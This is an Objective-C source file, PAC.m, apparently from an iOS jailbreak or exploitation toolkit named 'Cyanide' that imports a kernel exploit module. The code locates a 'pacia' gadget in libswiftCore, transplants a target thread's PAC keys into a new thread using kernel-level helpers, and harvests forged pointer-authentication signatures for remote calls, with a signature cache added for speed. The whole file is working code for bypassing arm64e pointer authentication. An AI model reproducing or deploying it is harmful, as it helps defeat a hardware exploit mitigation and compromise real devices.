//
//  PAC.m
//  Cyanide
//
//  Created by seo on 4/4/26.
//
#import "PAC.h"
#import "RemoteCall.h"
#import "Thread.h"
#import "Exception.h"
#import "../../kexploit/kexploit_opa334.h"
#import "../../kexploit/kutils.h"

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <pthread.h>
#import <mach/mach.h>

extern bool gIsPACSupported;

extern uint64_t g_RC_gadgetPacia;

uint64_t native_strip(uint64_t address)
{
    return address & 0x7fffffffffULL;
}

uint64_t pacia(uint64_t ptr, uint64_t modifier)
{
    uint64_t stripped = native_strip(ptr);
    uint64_t result = stripped;
    if (gIsPACSupported) {
        __asm__ volatile (
            "mov x16, %[ptr]\n"
            "mov x17, %[mod]\n"
            ".long 0xDAC10230\n"
            "mov %[ptr], x16\n"
            : [ptr] "+r"(result)
            : [mod] "r"(modifier)
            : "x16", "x17"
        );
    }
    return result;
}

uint64_t ptrauth_blend_discriminator_wrapper(uint64_t diver, uint64_t discriminator)
{
    return (diver & 0xFFFFFFFFFFFFULL) | discriminator;
}

uint64_t ptrauth_string_discriminator_special(const char *name)
{
    if (strcmp(name, "pc") == 0) return 0x7481000000000000ULL;
    if (strcmp(name, "lr") == 0) return 0x77d3000000000000ULL;
    if (strcmp(name, "sp") == 0) return 0xcbed000000000000ULL;
    if (strcmp(name, "fp") == 0) return 0x4517000000000000ULL;
    return 0;
}

uint64_t find_pacia_gadget(void)
{
    const uint32_t paciaGadgetOpcodes[] = {
        0xDAC10230,   // pacia x16, x17
        0xAA1003E0,   // mov x0, x16
        0xD65F03C0    // ret
    };
    void *sym = dlsym(RTLD_DEFAULT, "$sSwySWSnySiGciM");    //dsc's /usr/lib/swift/libswiftCore.dylib; Swift.UnsafeMutableRawBufferPointer.subscript.modify : (Swift.Range<Swift.Int>) -> Swift.UnsafeRawBufferPointer
    if (!sym) {
        printf("[%s:%d] $sSwySWSnySiGciM symbol not found\n", __FUNCTION__, __LINE__);
        return 0;
    }
    uint64_t symAddr = native_strip((uint64_t)sym);
    uint8_t *searchBase = (uint8_t *)(uintptr_t)symAddr;
    for (size_t offset = 0; offset + sizeof(paciaGadgetOpcodes) <= 0x1000; offset += 4) {
        if (memcmp(searchBase + offset, paciaGadgetOpcodes, sizeof(paciaGadgetOpcodes)) == 0) {
            return symAddr + offset;
        }
    }
    printf("[%s:%d] pacia gadget not found\n", __FUNCTION__, __LINE__);
    return 0;
}

void pac_cleanup(mach_port_t pacThread, mach_port_t exceptionPort, void *stack)
{
    if (MACH_PORT_VALID(pacThread)) {
        thread_terminate(pacThread);
        mach_port_deallocate(mach_task_self_, pacThread);
    }
    destroy_exception_port(exceptionPort);
    if (stack)
        free(stack);
}

// The signature of one (address, modifier) pair.
//
// PACIA is a pure function of the value it signs, the modifier, the SP it runs
// with, and the two PAC keys of the thread it runs in. The crossing engine
// signs the same handful of values thousands of times a second: the program
// counter of the function being called, and the 0x401 return sentinel.
//
// Computing one costs a thread, an exception port and a 16KB stack, and all
// three are created and torn down again for the sake of a single instruction.
// At 55 crossings a frame and 50 frames a second that is roughly eleven
// thousand thread creations and eleven thousand mach ports a second, and it
// is what the "pac" bucket of the crossing cost log is made of: 86 to 127
// microseconds on every crossing, a third of the whole thing.
//
// The cache key is everything the signature depends on, including the stack
// address, so a hit returns exactly what a fresh computation would have
// returned. The stack address is in the key because PACIA uses the SP as its
// context, and because the allocator hands back the same block every time: if
// it ever hands back a different one, the signature is different and the
// cache misses rather than returning the wrong value.
//
// The keys are read from the target thread on every call, not cached, so a
// target that respawns under different keys misses the cache instead of
// signing with keys that are no longer its own.
#define PAC_SIG_SLOTS 64
typedef struct {
    uint8_t  used;
    uint64_t sp;
    uint64_t keyA;
    uint64_t keyB;
    uint64_t address;
    uint64_t modifier;
    uint64_t signedValue;
} PacSigEntry;
static PacSigEntry g_pacSig[PAC_SIG_SLOTS];
static int g_pacSigNext = 0;
static pthread_mutex_t g_pacSigLock = PTHREAD_MUTEX_INITIALIZER;

uint64_t remote_pac(uint64_t remoteThreadAddr, uint64_t address, uint64_t modifier) {
    if(!gIsPACSupported)
        return address;
    
    if(!g_RC_gadgetPacia) {
        uint64_t gadgetAddr = find_pacia_gadget();
        if(gadgetAddr == 0) {
            printf("[%s:%d] find_pacia_gadget failed\n", __FUNCTION__, __LINE__);
            return -1;
        }
        g_RC_gadgetPacia = gadgetAddr;
    }
    
    address = native_strip(address);
    
    uint64_t keyA = thread_get_rop_pid(remoteThreadAddr);
    uint64_t keyB = thread_get_jop_pid(remoteThreadAddr);

    // The stack comes first, before the thread and the port, because the
    // stack address is part of the signature and the lookup needs to know it.
    // The allocation is the same size, in the same place in the sequence, as
    // it was before the cache existed, so the address the allocator hands back
    // is the same one it handed back then.
    void* stack = malloc(0x4000);
    if (!stack) {
        printf("[%s:%d] malloc failed\n", __FUNCTION__, __LINE__);
        return -1;
    }
    uint64_t sp = (uint64_t)(uintptr_t)stack + 0x2000;

    pthread_mutex_lock(&g_pacSigLock);
    for (int i = 0; i < PAC_SIG_SLOTS; i++) {
        const PacSigEntry *e = &g_pacSig[i];
        if (e->used && e->sp == sp && e->keyA == keyA && e->keyB == keyB &&
            e->address == address && e->modifier == modifier) {
            const uint64_t hit = e->signedValue;
            pthread_mutex_unlock(&g_pacSigLock);
            free(stack);
            return hit;
        }
    }
    pthread_mutex_unlock(&g_pacSigLock);

    memset(stack, 0, 0x4000);
    
    mach_port_t pacThread = MACH_PORT_NULL;
    kern_return_t kr = thread_create(mach_task_self_, &pacThread);
    if(kr != KERN_SUCCESS) {
        printf("[%s:%d] thread_create failed, kr = %s (0x%x)\n", __FUNCTION__, __LINE__, mach_error_string(kr), kr);
        free(stack);
        return -1;
    }
    
    arm_thread_state64_internal state;
    memset(&state, 0, sizeof(state));
    state.__sp = sp;
    state.__pc = pacia(g_RC_gadgetPacia, ptrauth_string_discriminator("pc"));
    state.__lr = pacia(0x401, ptrauth_string_discriminator("lr"));
    
    state.__x[0]  = 0;
    state.__x[1]  = address;
    state.__x[2]  = modifier;
    state.__x[3]  = (uint64_t)pacThread;
    state.__x[16] = address;
    state.__x[17] = modifier;
    
    mach_port_t exceptionPort = create_exception_port();
    if (!exceptionPort) {
        printf("[%s:%d] create_exception_port failed\n", __FUNCTION__, __LINE__);
        pac_cleanup(pacThread, MACH_PORT_NULL, stack);
        return 0;
    }

    kr = thread_set_exception_ports(pacThread,
                                    EXC_MASK_BAD_ACCESS,
                                    exceptionPort,
                                    EXCEPTION_STATE | MACH_EXCEPTION_CODES,
                                    ARM_THREAD_STATE64);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] thread_set_exception_ports failed: 0x%x (%s)\n", __FUNCTION__, __LINE__, kr, mach_error_string(kr));
        pac_cleanup(pacThread, exceptionPort, stack);
        return 0;
    }
    
    uint64_t pacThreadAddr = task_get_ipc_port_kobject(task_self(), pacThread);
    if (!pacThreadAddr) {
        printf("[%s:%d] task_get_ipc_port_kobject failed\n", __FUNCTION__, __LINE__);
        pac_cleanup(pacThread, exceptionPort, stack);
        return 0;
    }
    
    if (!thread_set_state_wrapper(pacThread, pacThreadAddr, &state)) {
        printf("[%s:%d] thread_set_state_wrapper failed\n", __FUNCTION__, __LINE__);
        pac_cleanup(pacThread, exceptionPort, stack);
        return 0;
    }
    
    thread_set_pac_keys(pacThreadAddr, keyA, keyB);
    
    kr = thread_resume(pacThread);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] thread_resume failed: 0x%x (%s)\n", __FUNCTION__, __LINE__, kr, mach_error_string(kr));
        pac_cleanup(pacThread, exceptionPort, stack);
        return 0;
    }
    
    ExceptionMessage exc;
    memset(&exc, 0, sizeof(exc));

    if (!wait_exception(exceptionPort, &exc, 100, false)) {
        printf("[%s:%d] wait_exception failed\n", __FUNCTION__, __LINE__);
        pac_cleanup(pacThread, exceptionPort, stack);
        return 0;
    }
    
    uint64_t signedAddress = exc.threadState.__x[16];

    // Remember it. The next call for the same value, with the same keys and
    // the same stack, gets the same signature and skips the whole thread.
    pthread_mutex_lock(&g_pacSigLock);
    PacSigEntry *e = &g_pacSig[g_pacSigNext];
    g_pacSigNext = (g_pacSigNext + 1) % PAC_SIG_SLOTS;
    e->used = 1;
    e->sp = sp;
    e->keyA = keyA;
    e->keyB = keyB;
    e->address = address;
    e->modifier = modifier;
    e->signedValue = signedAddress;
    pthread_mutex_unlock(&g_pacSigLock);

    pac_cleanup(pacThread, exceptionPort, stack);
    
    return signedAddress;
}
